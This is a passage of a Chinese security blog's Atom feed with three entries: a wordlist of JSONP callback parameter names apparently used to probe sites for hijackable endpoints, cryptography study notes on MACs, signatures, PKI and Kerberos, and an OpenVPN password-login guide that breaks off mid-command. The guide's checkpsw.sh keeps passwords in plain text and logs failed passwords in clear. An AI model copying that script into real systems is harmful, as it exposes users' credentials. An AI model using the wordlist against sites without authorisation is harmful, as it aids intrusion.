<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sun1024</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-03-08T12:45:39.617Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sun1024</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>回调参数收集</title>
    <link href="http://yoursite.com/2019/03/08/%E5%9B%9E%E8%B0%83%E5%8F%82%E6%95%B0%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/03/08/回调参数收集/</id>
    <published>2019-03-08T12:43:21.109Z</published>
    <updated>2019-03-08T12:45:39.617Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">callback=test</div><div class="line">cb=test</div><div class="line">jsonp=test</div><div class="line">jsonpcallback=test</div><div class="line">jsonpcb=test</div><div class="line">jsconpcb=test</div><div class="line">json=test</div><div class="line">jsonp=test</div><div class="line">jsoncallback=test</div><div class="line">jcb=test</div><div class="line">call=test</div><div class="line">jsoncallb=test</div><div class="line">json_callb=test</div><div class="line">jsonp_callback=test</div><div class="line">json_callback=test</div><div class="line">jsonp_cb=test</div><div class="line">callbackparam=test</div><div class="line">jsconpcb=test</div><div class="line">jscon=test</div><div class="line">jsconcallback=test</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;
      
    
    </summary>
    
    
      <category term="javascript" scheme="http://yoursite.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>密码学基础笔记(四)</title>
    <link href="http://yoursite.com/2019/02/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0(%E5%9B%9B)/"/>
    <id>http://yoursite.com/2019/02/24/密码学基础笔记(四)/</id>
    <published>2019-02-24T14:10:58.867Z</published>
    <updated>2019-02-24T14:13:08.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第12章-消息认证码"><a href="#第12章-消息认证码" class="headerlink" title="第12章  消息认证码"></a><strong>第12章  消息认证码</strong></h2><blockquote><p>完整性（Integrity）：指信息在存储或传输过程中保持未经授权不能改变的特性。</p></blockquote><h3 id="消息认证码的定义及使用方式"><a href="#消息认证码的定义及使用方式" class="headerlink" title="消息认证码的定义及使用方式"></a><strong>消息认证码的定义及使用方式</strong></h3><p>消息认证码，又称密码校验和或者MAC，是一种认证技术，它利用密钥来生成一个固定长度的短数据块，并将该数据块附加在消息之后。</p><p>A和B共享密钥K。A想发送消息M给B，A首先计算MAC=CK(M)，其中CK(·)是密钥控制的公开函数，然后发送M‖MAC给B，B收到后做与A相同的计算，求得一新MAC，并与收到的MAC做比较。</p><p><img src="/images/mima4/1550751645468.png" alt="1550751645468"></p><p>如果只有双方知道K，且B计算得到的MAC与接收到的MAC一致，则可实现以下功能：</p><ol><li><strong>接收方相信发送方发来的消息未被篡改</strong>：因为攻击者不知道密钥，所以不能在篡改消息后计算出正确的MAC，而如果只篡改消息不修改MAC，则接收方计算的新MAC将与收到的MAC不同。</li><li><strong>接收方相信发送方不是冒充的</strong>：因为其他人不知道密钥，所以其他人不可能对发送的消息计算出正确的MAC 。</li></ol><blockquote><p>MAC与加密类似，不同之处在于MAC不可逆。</p></blockquote><p>上述过程中，由于在发送过程中消息是以明文形式存在，因此这一过程只提供认证性而不提供保密性。为提供保密性可在MAC函数以后或以前进行加密。</p><p><img src="/images/mima4/1550751811375.png" alt="1550751811375"></p><p><img src="/images/mima4/1550751820324.png" alt="1550751820324"></p><h3 id="数据认证算法"><a href="#数据认证算法" class="headerlink" title="数据认证算法"></a><strong>数据认证算法</strong></h3><p>数据认证算法是最为广泛使用的一种消息认证码，已作为FIPS Publication（FIPS PUB 113）并被ANSI选为X9.17标准。</p><p>算法基于CBC模式的DES算法，其初始向量取为零向量。将数据分为64比特长的分组D1，D2，…，DN，其中最后一个分组不够64比特的话，可在其右边填充一些0，然后按以下过程计算数据认证码。</p><p><img src="/images/mima4/1550751939053.png" alt="1550751939053"></p><h3 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a><strong>HMAC</strong></h3><p>近年来研究构造MAC的兴趣主要是基于Hash函数的构造方法，这是因为：\</p><ul><li>Hash函数(如MD5、SHA)的软件实现快于分组密码。</li><li>Hash函数的库代码来源广泛。</li></ul><p>Hash函数并不是为用于MAC而设计的，由于Hash函数不使用密钥，因此不能直接用于MAC。目前已提出了很多将Hash函数用于构造MAC的方法，其中HMAC就是其中之一，已作为RFC<br>2104被公布，并在IPSec和其他网络协议（如SSL）中得以应用。</p><h3 id="HMAC的设计目标"><a href="#HMAC的设计目标" class="headerlink" title="HMAC的设计目标"></a><strong>HMAC的设计目标</strong></h3><p>RFC2104列举了HMAC的以下设计目标：</p><ol><li>可不经修改而使用现有的Hash函数，特别是那些易于软件实现的、源代码可方便获取且免费使用的Hash函数。</li><li>其中镶嵌的Hash函数可易于替换为更快或更安全的Hash函数。</li><li>保持镶嵌的Hash函数的最初性能，不因用于HMAC而使其性能降低。</li><li>以简单方式使用和处理密钥。</li><li>在对镶嵌的Hash函数合理假设的基础上，易于分析HMAC用于认证时的密码强度。</li></ol><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a><strong>算法描述</strong></h3><p><img src="/images/mima4/1550752207866.png" alt="1550752207866"></p><p>HMAC算法的实现如下：</p><ul><li>H是算法中嵌入的Hash函数，如MD5、SHA-1。</li><li>M是HMAC的输入消息，mi (i=1, 2, …, L)是M的第i个分组，每个分组为b bit。</li><li>K为密钥：</li></ul><blockquote><p>当K的长度大于b bit时，用H(K)值替代原来的K，即length(K)&gt;b，则K←H(K)。</p><p>当K的长度小于b bit时，将K的右边填充0，使其成为长度为b bit，记为K+，即length(K) &lt; b，则K+ ← (K || 00…0)。如果K的长度刚好等于b bit，则不作处理。</p></blockquote><ul><li>ipad为00110110（即0x36）重复b/8次后的序列。</li><li>opad为01011100（即0x5C）重复b/8次后的序列。</li></ul><ol><li>将K+与ipad逐比特异或得到b bit的分组Si，即计算Si =K+Åipad。</li><li>把输入消息M=m1m2…mL附加在Si的右端，得到Si||M。</li><li>将Si||M作为Hash函数H的输入，得到n比特的输出H(Si||M)。</li><li>将K+与opad逐比特异或得到b bit的分组S0，即计算S0=K+Åopad。</li><li>将第3）步得到的H(Si||M)填充到b bit后附加在S0的右端。</li><li>将第5）步后的值作为Hash函数H的输入，得到的输出即为消息M的消息认证码HMACK(M)。</li></ol><h3 id="HMAC的安全性"><a href="#HMAC的安全性" class="headerlink" title="HMAC的安全性"></a><strong>HMAC的安全性</strong></h3><p>HMAC的安全性取决于镶嵌的Hash函数的安全性，它的设计者已经证明了对HMAC的攻击等价于对内嵌Hash函数的下述两种攻击之一：</p><ol><li>攻击者能够计算压缩函数的一个输出，即使IV是随机的和秘密的。</li><li>攻击者能够找出哈希函数的碰撞，即使IV是随机的和秘密的。</li></ol><h2 id="第13章-数字签名"><a href="#第13章-数字签名" class="headerlink" title="第13章  数字签名"></a><strong>第13章  数字签名</strong></h2><h3 id="数字签名简介"><a href="#数字签名简介" class="headerlink" title="数字签名简介"></a><strong>数字签名简介</strong></h3><blockquote><p>1976年，Diffie和Hellman首次提出数字签名的概念，当时在学术界和计算机网络界受到了广泛重视。</p></blockquote><p><strong>数字签名需求</strong></p><ul><li>签名必须与消息相关。</li><li>签名必须使用发送方某些独有的信息，防止伪造和否认。</li><li>产生和验证签名都比较容易。</li><li>无论是从给定的签名伪造消息，还是从给定的消息伪造签名在计算上都是不可行的。</li><li>保存数字签名的副本是可行的。</li></ul><h3 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h3><p>  <strong>(1)</strong>  <strong>参数定义和密钥生成</strong> </p><ul><li>选两个大素数p和q；（保密）</li><li>计算n=p×q, ϕ(n)=(p−1)×(q−1); （n公开, ϕ(n)保密）</li><li>随机选一整数e，1&lt;e&lt;ϕ (n), 且 gcd(ϕ(n), e) = 1（公钥e公开）</li><li><p>计算d，满足 d×e ≡ 1 (mod ϕ(n))（私钥d保密）      </p><p><strong>(2)</strong>  <strong>签名算法</strong></p></li></ul><p>​       设消息为m，私钥为d，签名s如下：</p><p><img src="/images/mima4/1550752832169.png" alt="1550752832169"></p><p> <strong>(3)</strong>  <strong>验证算法</strong></p><p>​       接收者收到签名(m, s)时，验证如下：</p><p><img src="/images/mima4/1550752836199.png" alt="1550752836199"></p><p>若等式成立，则s是发送者对消息m的有效签名。由于s是用发送者的私钥经过签名算法所得，别人做不出这样的签名，可有效防止发送者的抵赖行为。</p><p>当对较长的消息签名时，需对每个消息分组分别签名，这样运算量就很大。</p><ul><li>为提高RSA签名方案的效率，对大容量消息签名前，签名者可使用一个Hash函数h来产生消息摘要h(m)，再计算签名：<strong>s = Sig**</strong>sk(m) ≡ (h(m))d<strong> </strong>mod n**。</li><li>接收者收到签名后先计算h(m), 再检验等式：<strong>h(m) ≡ s**</strong>e<strong> </strong>mod n** 是否成立，如果等式成立，则s是发送者对m的有效签名；否则，签名无效。</li></ul><h3 id="ElGamal数字签名方案"><a href="#ElGamal数字签名方案" class="headerlink" title="ElGamal数字签名方案"></a><strong>ElGamal数字签名方案</strong></h3><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p><ul><li>p是大素数</li><li>g是Zp<em>的一个生成元（即本原元素）</em></li><li><em>x是一个随机数，且x∈Zp</em></li><li>计算：<strong>y ≡ g**</strong>x<strong> </strong>mod p**</li><li>公钥为pk=(y, p, g)；私钥为sk=x</li></ul><p><strong>(2)</strong>  <strong>签名算法</strong></p><p>​        签名者选取随机数k∈Zp*并用私钥(p, g, y, x)计算：</p><p><strong>r ≡ g**</strong>k<strong> </strong>(mod p)      s ≡ (h(m)-xr)k<strong>**-1</strong> <strong>mod (p-1)</strong></p><p>生成签名(r, s)，其中h(m)为消息摘要。</p><p>​       <strong>(3)</strong>  <strong>验证算法</strong></p><p>​        验证者用公钥(y, p, g)验证签名(r, s)：</p><p><strong>y**</strong>r<strong><strong>r</strong></strong>s<strong> </strong>≡ g<strong>**h(m)</strong> <strong>(mod p)</strong></p><p>如果等式成立，则签名有效；否则，签名无效。</p><p><strong>ElGamal签名方案的安全性</strong></p><ol><li>ElGamal签名方案的安全性依赖于离散对数问题的困难性。若能求离散对数，则由y和g，可求出私有密钥x，该签名方案就不安全。</li><li>素数p必须足够大，且p-1至少包含一个大素数因子。</li><li>ElGamal签名是一个概率算法，对同一个消息m所产生的签名依赖于随机数k。随机数k不能泄露，且每次都不相同，否则用x=(h(m)-sk)r-1 mod (p-1)就可以计算出私钥。</li></ol><h3 id="Schnorr数字签名方案"><a href="#Schnorr数字签名方案" class="headerlink" title="Schnorr数字签名方案"></a><strong>Schnorr数字签名方案</strong></h3><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p><ul><li>p：大素数，p≥2512</li><li>q：大素数，q|(p-1)，q≥2160</li><li>g：g∈RZ*p, 且gq≡1 (mod p)</li><li>x：用户A的私钥，<strong>1&lt;**</strong>x&lt;q</li><li>y：用户A的公钥，<strong>y≡gx</strong>  <strong>(mod p)</strong></li></ul><p><strong>(2)  签名过程</strong></p><ol><li>选择随机数1&lt;k&lt;q，计算<strong>r≡gk</strong>  <strong>(mod p)</strong></li><li>计算<strong>e=H(r, m)**</strong>;<strong> </strong>s≡xe+k (mod q)**</li><li><p>签名内容(e, s)</p><p><strong>(3)  验证过程</strong></p></li><li><p>计算<strong>r′≡g**</strong>sy-e<strong>  </strong>(mod p)**</p></li><li>验证<strong>H(r′, m)=e</strong>是否成立</li></ol><h3 id="数字签名标准（DSS）"><a href="#数字签名标准（DSS）" class="headerlink" title="数字签名标准（DSS）"></a><strong>数字签名标准（</strong>DSS）</h3><p>数字签名标准（Digital Signature Standard，DSS）由美国国家标准和技术研究所（NIST）于1991年公布。</p><ul><li>DSS的核心是数字签名算法（Digital Signature Algorithm，DSA）。</li><li>它是ElGamal的变形，设计中使用了SHA-1算法。</li><li>DSS的安全性还是基于求解离散对数的困难性。</li></ul><p><strong>DSS</strong>的签名与验证过程:</p><p><img src="/images/mima4/1550753095888.png" alt="1550753095888"></p><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p><ul><li>p是满足2L-1&lt;p&lt;2L的大素数，其中L是512~1024比特且是64的倍数；q是长160比特的素数，满足q|(p-1)；</li><li>x是随机或者伪随机数，满足0&lt;x&lt;q；</li><li>g≡h(p-1)/q mod p，其中h满足1&lt;h&lt;p-1；</li><li>计算：<strong>y≡g**</strong>x<strong> </strong>mod p**；</li><li>公钥：k1=(p, q, g, <strong>y</strong>)，私钥：k2=<strong>x</strong>。</li></ul><p><strong>(2)</strong>  <strong>签名算法</strong></p><p>​        签名者选取一个随机数k，0&lt;k&lt;q。首先使用SHA-1计算出消息摘要h(m)，再使用签名算法生成签名(r, s)：</p><p><strong>r ≡ g**</strong>k<strong> </strong>(mod p) (mod q)<strong>      </strong>s ≡ (h(m)+xr)k<strong>**-1</strong> <strong>mod q</strong>     </p><p>​       <strong>(3)  验证算法</strong></p><p>​         验证者利用公钥k1=(p, q, g, y)验证签名(r, s)：      </p><p><strong>g**</strong>u<strong>1</strong>y<strong>u</strong>2<strong> </strong>(mod p) (mod q) ≡ r**</p><p>其中: u1≡h(m)s-1 (mod q)， u2≡rs-1 (mod q)</p><h2 id="第14章-密钥管理和分发"><a href="#第14章-密钥管理和分发" class="headerlink" title="第14章 密钥管理和分发"></a><strong>第14章 密钥管理和分发</strong></h2><h3 id="基于对称加密的对称密钥分发"><a href="#基于对称加密的对称密钥分发" class="headerlink" title="基于对称加密的对称密钥分发"></a><strong>基于对称加密的对称密钥分发</strong></h3><p>对于对称加密来说，通信双方必须使用相同的密钥并且该密钥要对其他人保密，在限制攻击者攻陷密钥所需的数据总数时，频繁的密钥交换是安全的。因此，任何密码系统的强度取决于密钥分发技术，即在想要交换数据的两者之间传递密钥且不被其他人知道的方法。</p><p><img src="/images/mima4/1550753516318.png" alt="1550753516318"></p><p>对A和B来说，密钥的分发能以以下不同的方式：</p><p>1.A选择一个密钥后以物理的方式传递给B。</p><p>2.第三方选择密钥后以物理的方式传递给A和B。</p><p>3.如果A和先前或者最近使用过一个密钥，则一方可以将新密钥用旧密钥加密后发送给另一方。如果A和B到第三方C有加密连接，C可以在加密连接上传送密钥给A和B。</p><h3 id="密钥分发方案"><a href="#密钥分发方案" class="headerlink" title="密钥分发方案"></a><strong>密钥分发方案</strong></h3><p><img src="/images/mima4/1550753558731.png" alt="1550753558731"></p><h3 id="层次密钥控制"><a href="#层次密钥控制" class="headerlink" title="层次密钥控制"></a><strong>层次密钥控制</strong></h3><p>大型网络需要层次体系的KDC，例如有本地KDC，每一个KDC负责其所在的整个内部网络的一个域。</p><p><img src="/images/mima4/1550753574370.png" alt="1550753574370"></p><h3 id="透明的密钥控制方案"><a href="#透明的密钥控制方案" class="headerlink" title="透明的密钥控制方案"></a><strong>透明的密钥控制方案</strong></h3><p>面向连接的自动密钥分发协议。</p><p><img src="/images/mima4/1550753594981.png" alt="1550753594981"></p><h3 id="分布式密钥控制"><a href="#分布式密钥控制" class="headerlink" title="分布式密钥控制"></a><strong>分布式密钥控制</strong></h3><p>密钥分发中心必须是可信的，而且是防破坏的，但如果密钥是完全分布式的，则无此要求。虽然对只使用对称加密的大型网络，完全分布式是不实用的，但是局部环境下还是很有用的。</p><p><img src="/images/mima4/1550753614839.png" alt="1550753614839"></p><h3 id="基于非对称加密的对称密钥分发"><a href="#基于非对称加密的对称密钥分发" class="headerlink" title="基于非对称加密的对称密钥分发"></a><strong>基于非对称加密的对称密钥分发</strong></h3><p><strong>简单密钥分发方案</strong></p><p><img src="/images/mima4/1550753634986.png" alt="1550753634986"></p><p>如果PUA和IDA没有经过认证绑定，则易遭受中间人攻击。类似于Diffie-Hellman密钥交换的中间人攻击。</p><p><strong>确保保密性和身份认证的密钥分发方案</strong></p><p><img src="/images/mima4/1550753650146.png" alt="1550753650146"></p><h3 id="公钥分发"><a href="#公钥分发" class="headerlink" title="公钥分发"></a><strong>公钥分发</strong></h3><p><strong>公钥的公开发布</strong></p><p>无控制的公钥分发。</p><p><img src="/images/mima4/1550753674497.png" alt="1550753674497"></p><p><strong>公开可访问的目录</strong></p><p>管理员维护一个动态可访问的公钥目录。</p><p><img src="/images/mima4/1550753690915.png" alt="1550753690915"></p><p><strong>公钥授权</strong></p><p>管理员维护一个公钥目录且他自己也有公私钥。</p><p><img src="/images/mima4/1550753705690.png" alt="1550753705690"></p><p><strong>公钥证书</strong></p><p>通信双方使用证书来交换密钥而不是通过管理员。</p><p><img src="/images/mima4/1550753722992.png" alt="1550753722992"></p><h3 id="X-509证书"><a href="#X-509证书" class="headerlink" title="X.509证书"></a><strong>X.509证书</strong></h3><p>X.509的核心是与每个用户相关的公钥证书。这些用户证书由一些可信的签证机构（Certificate<br>Authority CA）创建并被CA或用户放入目录服务器中。目录服务器本身不创建公钥和证书，仅仅为用户获得证书提供一种简单的存取方式。</p><p>CA用自己的私钥签署证书，如果用户知道相应的公钥，则用户就可以验证证书是CA签署的。        </p><p>CA生成的用户证书有以下特点：</p><ul><li><p>任何可以访问CA公钥的用户均可获得证书中的用户公钥。</p></li><li><p>只有CA可以修改证书。</p></li></ul><p>由于证书不可伪造，因此证书可以存放在目录中而不需要对目录进行特别保护。</p><p><strong>证书撤销</strong></p><p>每一个证书都有一个有效期，这与信用卡相似。通常，新的证书会在旧证书失效前发放，另外，还可能由于以下原因提前撤回证书：</p><p>1.用户私钥被认为不安全。</p><p>2.用户不再信任该CA。</p><p>3.CA证书被认为不安全。</p><p>每个CA必须保留一张表，其中包含所有被CA撤销且还未到期的证书，包括发给用户和其他CA的证书，这张表也应被放在目录中。</p><p>每个放在目录中的证书撤销列表CRL均被其发行商签名，并包含发行商的名字、表创建时间、下一张CRL表发放的时间以及每个撤销证书的入口。每个入口中包含该证书的序列号和撤销时间。</p><p>当一个用户在一个消息中接收到了一个证书，用户必须确定该证书是否已被撤销。用户可以在接到证书时检查目录，为了避免目录搜索时的延迟，用户可以将证书和CRL缓存。</p><h3 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h3><p>RFC 4949（互联网安全术语）定义了PKI系统是由硬件，软件，人，策略和程序构成的一整套体系。这些程序是用来创建，管理，存储，分发和撤销建立在非对称密码算法之上的数字证书。</p><p>创建PKI的主要目的就是用来安全、便捷、高效地获得公钥。PKIX（Public Key Infrastructure X. 509）工作组在X.<br>509的基础上建立了一个可以用来构建网络认证体系的基本模型。</p><p>PKIX的元素：</p><ul><li><strong>端实体：</strong>可以是终端用户、设备（如应用服务器、路由器等），或是其他可以在一个公钥数字证书作用范围中被认证的实体。终端实体支持PKI相关的设备。</li><li><strong>签证机构（CA）：</strong>证书和CRL的发行人，常常在其上运行着一个或多个注册机构（RA），同时它还承担一些其他的管理任务。</li><li>注册机构（RA）：<strong>承担一些CA的管理任务。一般来说都是和端实体注册进程相关的任务。</strong></li><li>CRL发布点：<strong>CA可以通过它来发布证书撤销列表。</strong></li><li>签证存取库：提供了存取数字证书和CRL的方法，可以被终端用户检索。</li></ul><h2 id="第15章-用户认证"><a href="#第15章-用户认证" class="headerlink" title="第15章  用户认证"></a><strong>第15章</strong>  <strong>用户认证</strong></h2><h2 id="远程用户认证原理"><a href="#远程用户认证原理" class="headerlink" title="远程用户认证原理"></a><strong>远程用户认证原理</strong></h2><p>认证一个用户的身份大致有四个常用方法：</p><ul><li>知道什么：如口令、个人身份号PIN或者之前准备问题的答案。</li><li>拥有什么：如加密密钥、电子密钥卡和物理密钥，这种类型的认证信息称为令牌。</li><li>静态生物特征：如指纹、虹膜和脸。</li><li>动态生物特征：如声音模式、手写特征和打字节奏。</li></ul><h3 id="基于对称加密的远程用户认证"><a href="#基于对称加密的远程用户认证" class="headerlink" title="基于对称加密的远程用户认证"></a><strong>基于对称加密的远程用户认证</strong></h3><p><strong>双向认证</strong></p><p>(1)  Needham-Schroeder协议</p><p>①  A→KDC：IDA‖IDB‖N1</p><p>②  KDC→A：EKa[KS‖IDB‖N1‖EKB[KS‖IDA]]</p><p>③  A→B：EKb[KS‖IDA]</p><p>④  B→A：EKs[N2]</p><p>⑤  A→B：EKs[f(N2)]</p><p><img src="/images/mima4/1550754509110.png" alt="1550754509110"></p><p>(2)  Denning协议</p><p>​        为防止重放攻击，可在第②步和第③步加上时戳：</p><p>①  A→KDC：IDA‖IDB</p><p>②  KDC→A：EKA[KS‖IDB‖T‖EKB[KS‖IDA‖T]]</p><p>③  A→B：EKB[KS‖IDA‖T]</p><p>④  B→A：EKS[N1]</p><p>⑤  A→B：EKS[f(N1)]</p><p><img src="/images/mima4/1550754522663.png" alt="1550754522663"></p><p>(3)  NEUM93协议</p><p>​       为了防止时钟不同步，同时加入随机数和时间戳。 </p><p>①  A→B：IDA‖NA</p><p>②  B→KDC：IDB‖NB‖EKB[IDA‖NA‖TB]</p><p>③  KDC→A：EKA[IDB‖NA‖KS‖TB]‖EKB[IDA‖KS‖TB]‖NB</p><p>④  A→B：EKB[IDA‖KS‖TB]‖EKS[NB]</p><p>以上协议为A、B双方建立共享的会话密钥提供了一个安全有效的手段。如果A保留由协议得到的票据，就可在有效时间范围内不再求助于认证服务器： </p><p>​       ①  A→B：EKB[IDA‖KS‖TB],  N′A</p><p>​        ②  B→A：N′B，EKS[N′A]</p><p>​        ③  A→B：EKS[N′B]</p><p>B在收到票据后，可通过TB检验票据是否过时，而新产生的随机数N′A、N′B则向双方保证了没有重放攻击。</p><p><strong>单向认证</strong></p><p>电子邮件等网络应用有一个最大的优点就是不要求收发双方同时在线，发送方将邮件发往接收方的信箱，邮件在信箱中存着，直到接收方阅读时才打开。</p><p>①  A→KDC：IDA‖IDB‖N1</p><p>②  KDC→A：EKA[KS‖IDB‖N1‖EKB[KS‖IDA]]</p><p>③  A→B：EKB[KS‖IDA]‖EKS[M]</p><p>​        本协议不要求B同时在线，但保证了只有B能解读消息，同时还提供了对消息的发方A的认证。</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a><strong>Kerberos</strong></h3><p>Kerberos是MIT开发的认证服务系统，它建立了一个中心认证服务器用以向用户和服务器提供相互认证。</p><p>用户希望访问网络服务器，服务器要求认证用户的访问请求，并仅允许通过认证的用户访问，以防未授权用户得到服务和数据。以Kerberos V4为例，系统使用的协议是基于Needham-Schroeder认证协议。</p><p><img src="/images/mima4/1550754594047.png" alt="1550754594047"></p><p><strong>Kerberos V4</strong></p><p>如果网络环境未加任何保护手段，则任一用户都可获取任一服务器（V）提供的服务。这时明显的安全威胁是假冒，即敌手可假装是一客户以获取访问服务器的特权。为防止这种假冒，服务器应能够确定客户的身份，但在开放环境中则给服务器增加了过重的负担。为此引入一个称为认证服务器AS（authentication server）的第三方来承担对用户的认证，AS知道每个用户的口令，并将口令存在一个中心数据库。</p><p>Kerberos认证系统设置了两个服务器：</p><ul><li>认证服务器（Authentication Server, AS）</li><li>票据许可服务器（Ticket-Granting Server, TGS）</li></ul><p><img src="/images/mima4/1550754622584.png" alt="1550754622584"></p><p><strong>Kerberos V4**</strong>的认证过程**</p><p>​       分为三个阶段六个步骤：</p><ul><li>阶段1  (认证服务交换)</li><li>阶段2  (票据许可服务交换)</li><li>阶段3  (客户与业务服务器的认证交换)</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以Rivest的话结尾：</p><blockquote><p><strong>密码学是一门研究如何在敌人存在的环境中安全通信的学科。</strong></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第12章-消息认证码&quot;&gt;&lt;a href=&quot;#第12章-消息认证码&quot; class=&quot;headerlink&quot; title=&quot;第12章  消息认证码&quot;&gt;&lt;/a&gt;&lt;strong&gt;第12章  消息认证码&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;完整性（In
      
    
    </summary>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>openvpn实现用户名密码登陆</title>
    <link href="http://yoursite.com/2019/02/24/openvpn%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86/"/>
    <id>http://yoursite.com/2019/02/24/openvpn实现用户名密码登陆/</id>
    <published>2019-02-24T14:09:54.944Z</published>
    <updated>2019-02-24T14:10:15.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="openvpn实现用户名密码登陆"><a href="#openvpn实现用户名密码登陆" class="headerlink" title="openvpn实现用户名密码登陆"></a>openvpn实现用户名密码登陆</h2><h3 id="0x00-openvpn安装"><a href="#0x00-openvpn安装" class="headerlink" title="0x00 openvpn安装"></a>0x00 openvpn安装</h3><p>网上教程一堆，这里采用懒人傻瓜式安装方式，感谢大佬的脚本：<a href="https://github.com/Nyr/openvpn-install" target="_blank" rel="external">https://github.com/Nyr/openvpn-install</a>.</p><blockquote><p>bash openvpn-install.sh</p></blockquote><p>然后一路回车不到一分钟即可搭建好一个openVPN服务器。。。</p><h3 id="0x01-服务端配置"><a href="#0x01-服务端配置" class="headerlink" title="0x01 服务端配置"></a>0x01 服务端配置</h3><p>在server.conf中添加如下内容</p><blockquote><p>vim /etc/openvpn/server.conf</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auth-user-pass-verify /etc/openvpn/checkpsw.sh via-env</div><div class="line">username-as-common-name</div><div class="line">script-security 3 execve</div></pre></td></tr></table></figure><p>在/etc/openvpn目录下添加文件checkpsw.sh:</p><blockquote><p>vim /etc/openvpn/checkpsw.sh</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">###########################################################</div><div class="line">#checkpsw.sh (C) 2004 Mathias Sundman &lt;mathias@openvpn.se&gt;</div><div class="line">#</div><div class="line"># This script will authenticate OpenVPN users against</div><div class="line"># a plain text file. The passfile should simply contain</div><div class="line"># one row per user with the username first followed by</div><div class="line"># one or more space(s) or tab(s) and then the password.</div><div class="line"></div><div class="line">PASSFILE=&quot;/etc/openvpn/psw-file&quot;</div><div class="line">LOG_FILE=&quot;/etc/openvpn/openvpn-password.log&quot;</div><div class="line">TIME_STAMP=`date &quot;+%Y-%m-%d %T&quot;`</div><div class="line"></div><div class="line">###########################################################</div><div class="line"></div><div class="line">if [ ! -r &quot;$&#123;PASSFILE&#125;&quot; ]; then</div><div class="line">  echo &quot;$&#123;TIME_STAMP&#125;: Could not open password file \&quot;$&#123;PASSFILE&#125;\&quot; for reading.&quot; &gt;&gt; $&#123;LOG_FILE&#125;</div><div class="line">  exit 1</div><div class="line">fi</div><div class="line"></div><div class="line">CORRECT_PASSWORD=`awk &apos;!/^;/&amp;&amp;!/^#/&amp;&amp;$1==&quot;&apos;$&#123;username&#125;&apos;&quot;&#123;print $2;exit&#125;&apos; $&#123;PASSFILE&#125;`</div><div class="line"></div><div class="line">if [ &quot;$&#123;CORRECT_PASSWORD&#125;&quot; = &quot;&quot; ]; then</div><div class="line">  echo &quot;$&#123;TIME_STAMP&#125;: User does not exist: username=\&quot;$&#123;username&#125;\&quot;, password=\&quot;$&#123;password&#125;\&quot;.&quot; &gt;&gt; $&#123;LOG_FILE&#125;</div><div class="line">  exit 1</div><div class="line">fi</div><div class="line"></div><div class="line">if [ &quot;$&#123;password&#125;&quot; = &quot;$&#123;CORRECT_PASSWORD&#125;&quot; ]; then</div><div class="line">  echo &quot;$&#123;TIME_STAMP&#125;: Successful authentication: username=\&quot;$&#123;username&#125;\&quot;.&quot; &gt;&gt;$&#123;LOG_FILE&#125;</div><div class="line">  exit 0</div><div class="line">fi</div><div class="line"></div><div class="line">echo &quot;$&#123;TIME_STAMP&#125;: Incorrect password: username=\&quot;$&#123;username&#125;\&quot;, password=\&quot;$&#123;password&#125;\&quot;.&quot; &gt;&gt; $&#123;LOG_FILE&#125;</div><div class="line">exit 1</div></pre></td></tr></table></figure><p>给予执行权限：</p><blockquote><p>chmod 